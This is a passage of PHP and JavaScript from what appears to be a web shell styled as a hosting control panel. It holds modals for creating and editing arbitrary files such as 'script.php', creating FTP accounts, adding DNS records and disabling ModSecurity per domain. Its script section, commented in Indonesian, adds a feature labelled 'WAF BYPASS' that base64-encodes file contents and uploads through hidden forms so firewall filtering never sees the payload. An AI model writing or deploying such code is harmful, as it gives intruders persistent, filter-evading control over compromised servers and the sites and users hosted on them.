                <?php if (!empty($modsecDomains['data'])) { foreach ($modsecDomains['data'] as $domain) { echo '<tr class="border-b border-ink/20 hover:bg-black/5"><td class="p-3 font-bold">'.htmlspecialchars($domain['domain']).'</td><td class="p-3 font-bold '.($domain['enabled']?'text-stampGreen':'text-stampRed').'">'.($domain['enabled']?'Enabled':'Disabled').'</td><td class="p-3 text-right"><form method="post"><input type="hidden" name="action" value="toggle_modsec"><input type="hidden" name="domain" value="'.htmlspecialchars($domain['domain']).'"><button type="submit" name="'.($domain['enabled']?'disable':'enable').'" class="px-3 py-1 font-bold text-xs uppercase border-b-2 '.($domain['enabled']?'text-stampRed border-stampRed hover:bg-stampRed':'text-stampGreen border-stampGreen hover:bg-stampGreen').' hover:text-paper transition-all">'.($domain['enabled']?'Disable':'Enable').'</button></form></td></tr>'; }}?>
            </tbody></table></div>
        </div>
        <?php endif; ?>
    </main>
</div>

<div id="createFileModal" class="hidden fixed inset-0 bg-ink/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
    <div class="dossier-panel bg-paper rounded-none p-8 max-w-lg w-full modal border-2 border-ink">
        <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-2"><h3 class="text-xl font-serif font-bold text-ink">Create New File</h3><button onclick="hideModal('createFileModal')" class="text-ink text-2xl font-bold">&times;</button></div>
        <form method="post" class="space-y-6" onsubmit="return handleWAFBypass(this, 'create_content', 'create_content_b64');">
            <input type="hidden" name="action" value="create_file">
            <input type="hidden" name="content_b64" id="create_content_b64">
            <div><label class="block text-ink font-bold mb-1 text-sm">File Name</label><input type="text" name="filename" class="w-full p-2" placeholder="script.php" required></div>
            <div><label class="block text-ink font-bold mb-1 text-sm">Content</label><textarea id="create_content" rows="5" class="w-full p-2"></textarea></div>
            <div class="flex justify-end gap-4 pt-4 border-t border-ink/20"><button type="button" onclick="hideModal('createFileModal')" class="px-5 py-2 font-bold uppercase text-ink/70 hover:text-ink">Cancel</button><button type="submit" class="btn-primary px-5 py-2">Create</button></div>
        </form>
    </div>
</div>

<div id="editFileModal" class="hidden fixed inset-0 bg-ink/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
    <div class="dossier-panel bg-paper rounded-none p-8 max-w-3xl w-full modal border-2 border-ink">
        <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-2"><h3 class="text-xl font-serif font-bold text-ink">Edit File</h3><button onclick="hideModal('editFileModal')" class="text-ink text-2xl font-bold">&times;</button></div>
        <form method="post" class="space-y-4" onsubmit="return handleWAFBypass(this, 'edit_content', 'edit_content_b64');">
            <input type="hidden" name="action" value="edit_file"><input type="hidden" id="edit_filename" name="filename">
            <input type="hidden" name="content_b64" id="edit_content_b64">
            <input type="text" id="edit_filename_display" class="w-full p-2 font-bold mb-2 text-stampRed bg-transparent border-none!" readonly>
            <textarea id="edit_content" rows="12" class="w-full p-3 font-mono text-sm border-2 border-ink/40 bg-paper focus:bg-white resize-y"></textarea>
            <div class="flex justify-end gap-4 pt-4 border-t border-ink/20"><button type="button" onclick="hideModal('editFileModal')" class="px-5 py-2 font-bold uppercase text-ink/70 hover:text-ink">Cancel</button><button type="submit" class="btn-primary px-5 py-2 text-stampGreen border-stampGreen hover:bg-stampGreen hover:text-paper">Save Changes</button></div>
        </form>
    </div>
</div>

<div id="createFolderModal" class="hidden fixed inset-0 bg-ink/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
    <div class="dossier-panel bg-paper rounded-none p-8 max-w-lg w-full modal border-2 border-ink">
        <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-2"><h3 class="text-xl font-serif font-bold text-ink">Create New Folder</h3><button onclick="hideModal('createFolderModal')" class="text-ink text-2xl font-bold">&times;</button></div>
        <form method="post" class="space-y-6">
            <input type="hidden" name="action" value="create_folder">
            <div><label class="block text-ink font-bold mb-1 text-sm">Folder Name</label><input type="text" name="foldername" class="w-full p-2" required></div>
            <div class="flex justify-end gap-4 pt-4 border-t border-ink/20"><button type="button" onclick="hideModal('createFolderModal')" class="px-5 py-2 font-bold uppercase text-ink/70 hover:text-ink">Cancel</button><button type="submit" class="btn-primary px-5 py-2">Create</button></div>
        </form>
    </div>
</div>

<div id="viewFileModal" class="hidden fixed inset-0 bg-ink/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
    <div class="dossier-panel bg-paper rounded-none p-8 max-w-3xl w-full modal border-2 border-ink">
        <div class="flex justify-between items-center mb-4 border-b-2 border-ink pb-2"><h3 id="view_filename" class="text-xl font-serif font-bold text-ink break-all"></h3><button onclick="hideModal('viewFileModal')" class="text-ink text-2xl font-bold">&times;</button></div>
        <pre id="view_content" class="w-full p-4 bg-black/5 border border-ink/20 text-ink max-h-96 overflow-auto text-sm whitespace-pre-wrap"></pre>
        <div class="mt-6 text-right"><button type="button" onclick="hideModal('viewFileModal')" class="btn-primary px-5 py-2">Close</button></div>
    </div>
</div>

<div id="renameModal" class="hidden fixed inset-0 bg-ink/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
    <div class="dossier-panel bg-paper rounded-none p-8 max-w-lg w-full modal border-2 border-ink">
        <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-2"><h3 class="text-xl font-serif font-bold text-ink">Rename Item</h3><button onclick="hideModal('renameModal')" class="text-ink text-2xl font-bold">&times;</button></div>
        <form method="post" class="space-y-6">
            <input type="hidden" name="action" value="rename"><input type="hidden" id="rename_old_name" name="old_name"><input type="hidden" id="rename_type" name="type">
            <div><label class="block text-ink font-bold mb-1 text-sm">Current Name</label><input type="text" id="rename_old_name_display" class="w-full p-2 text-ink/60 border-dashed" readonly></div>
            <div><label class="block text-ink font-bold mb-1 text-sm">New Name</label><input type="text" id="rename_new_name" name="new_name" class="w-full p-2" required></div>
            <div class="flex justify-end gap-4 pt-4 border-t border-ink/20"><button type="button" onclick="hideModal('renameModal')" class="px-5 py-2 font-bold uppercase text-ink/70 hover:text-ink">Cancel</button><button type="submit" class="btn-primary px-5 py-2 text-yellow-600 border-yellow-600 hover:bg-yellow-600 hover:text-paper">Rename</button></div>
        </form>
    </div>
</div>

<div id="createFTPModal" class="hidden fixed inset-0 bg-ink/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
    <div class="dossier-panel bg-paper rounded-none p-8 max-w-lg w-full modal border-2 border-ink">
        <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-2"><h3 class="text-xl font-serif font-bold text-ink">Create FTP Account</h3><button onclick="hideModal('createFTPModal')" class="text-ink text-2xl font-bold">&times;</button></div>
        <form method="post" class="space-y-6">
            <input type="hidden" name="action" value="create_ftp">
            <div><label class="block text-ink font-bold mb-1 text-sm">Username</label><input type="text" name="login" class="w-full p-2" required></div>
            <div><label class="block text-ink font-bold mb-1 text-sm">Password</label><input type="password" name="password" class="w-full p-2" required></div>
            <div><label class="block text-ink font-bold mb-1 text-sm">Quota</label><select name="quota" class="w-full p-2"><option value="0">Unlimited</option><option value="500">500 MB</option><option value="1024">1 GB</option><option value="5120">5 GB</option></select></div>
            <div class="flex justify-end gap-4 pt-4 border-t border-ink/20"><button type="button" onclick="hideModal('createFTPModal')" class="px-5 py-2 font-bold uppercase text-ink/70 hover:text-ink">Cancel</button><button type="submit" class="btn-primary px-5 py-2">Create Account</button></div>
        </form>
    </div>
</div>

<div id="addDNSModal" class="hidden fixed inset-0 bg-ink/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
    <div class="dossier-panel bg-paper rounded-none p-8 max-w-lg w-full modal border-2 border-ink">
        <div class="flex justify-between items-center mb-6 border-b-2 border-ink pb-2"><h3 class="text-xl font-serif font-bold text-ink">Add DNS Record</h3><button onclick="hideModal('addDNSModal')" class="text-ink text-2xl font-bold">&times;</button></div>
        <form method="post" class="space-y-6">
            <input type="hidden" name="action" value="add_dns">
            <div><label class="block text-ink font-bold mb-1 text-sm">Name</label><input type="text" name="dname" placeholder="e.g. www or @" class="w-full p-2" required></div>
            <div><label class="block text-ink font-bold mb-1 text-sm">Type</label><select name="record_type" class="w-full p-2"><option>A</option><option>CNAME</option><option>TXT</option></select></div>
            <div><label class="block text-ink font-bold mb-1 text-sm">Value</label><input type="text" name="address" placeholder="e.g., 192.168.1.1" class="w-full p-2" required></div>
            <div><label class="block text-ink font-bold mb-1 text-sm">TTL</label><input type="text" name="ttl" value="14400" class="w-full p-2 text-ink/60 border-dashed"></div>
            <div class="flex justify-end gap-4 pt-4 border-t border-ink/20"><button type="button" onclick="hideModal('addDNSModal')" class="px-5 py-2 font-bold uppercase text-ink/70 hover:text-ink">Cancel</button><button type="submit" class="btn-primary px-5 py-2">Add Record</button></div>
        </form>
    </div>
</div>

<script>
// UI Control Functions
function showModal(id) { const el = document.getElementById(id); el.classList.remove('hidden'); setTimeout(() => el.querySelector('.modal').classList.add('show'), 10); }
function hideModal(id) { const el = document.getElementById(id); el.querySelector('.modal').classList.remove('show'); setTimeout(() => el.classList.add('hidden'), 300); }

const showFileModal = () => showModal('createFileModal'); 
const showFolderModal = () => showModal('createFolderModal'); 
const showFTPModal = () => showModal('createFTPModal'); 
const showAddDNSModal = () => showModal('addDNSModal');

function showEditModal(filename) { fetch(`?view=${encodeURIComponent(filename)}&dir=<?= urlencode($currentDir) ?>`).then(res => res.text()).then(data => { document.getElementById('edit_filename').value = filename; document.getElementById('edit_filename_display').value = "> " + filename; document.getElementById('edit_content').value = data; showModal('editFileModal'); }); }
function showViewModal(filename) { fetch(`?view=${encodeURIComponent(filename)}&dir=<?= urlencode($currentDir) ?>`).then(res => res.text()).then(data => { document.getElementById('view_filename').textContent = "[ " + filename + " ]"; document.getElementById('view_content').textContent = data; showModal('viewFileModal'); }); }
function showRenameModal(name, type) { document.getElementById('rename_old_name').value = name; document.getElementById('rename_old_name_display').value = name; document.getElementById('rename_new_name').value = name; document.getElementById('rename_type').value = type; showModal('renameModal'); }

// Perbaikan Toggle Hamburger Menu (Mobile Sidebar)
const btn = document.getElementById('mobile-menu-button'); 
const sidebar = document.getElementById('sidebar'); 
const overlay = document.getElementById('sidebar-overlay');

const toggleSidebar = () => { 
    sidebar.classList.toggle('-translate-x-full'); // Tailwind class untuk sliding effect
    overlay.classList.toggle('hidden'); 
};
if(btn) btn.addEventListener('click', toggleSidebar);
if(overlay) overlay.addEventListener('click', toggleSidebar);

// === FITUR WAF BYPASS & FALLBACK ===

// 1. Fallback Modifikasi Kode: Transformasi ke Base64 sebelum post submit
function handleWAFBypass(form, textareaId, b64InputId) {
    const rawContent = document.getElementById(textareaId).value;
    // Mengamankan unicode string agar tidak rusak via btoa
    const base64Content = btoa(unescape(encodeURIComponent(rawContent))); 
    document.getElementById(b64InputId).value = base64Content;
    // Disable textarea mentah agar browser tidak mengirim request string berbahaya ke server lokal
    document.getElementById(textareaId).disabled = true; 
    return true;
}

// 2. Fallback Upload File: Upload lokal diserialisasi via Base64 menggunakan FileReader
const uploaderBtn = document.getElementById('file-upload-base64');
if(uploaderBtn) {
    uploaderBtn.addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (!file) return;
        
        // Membaca isi file secara background dengan javascript
        const reader = new FileReader();
        reader.onload = function(event) {
            const base64Content = event.target.result.split(',')[1];
            const currentDir = document.getElementById('current_path_input').value;
            
            // Generate Hidden Form and Force submit bypass WAF
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="action" value="upload_base64">
                <input type="hidden" name="dir" value="${currentDir}">
                <input type="hidden" name="filename" value="${file.name}">
                <input type="hidden" name="filecontent" value="${base64Content}">
            `;
            document.body.appendChild(form);
            form.submit();
        };
        reader.readAsDataURL(file);
    });
}
</script>
<?php echo $htmlFooter; ?>
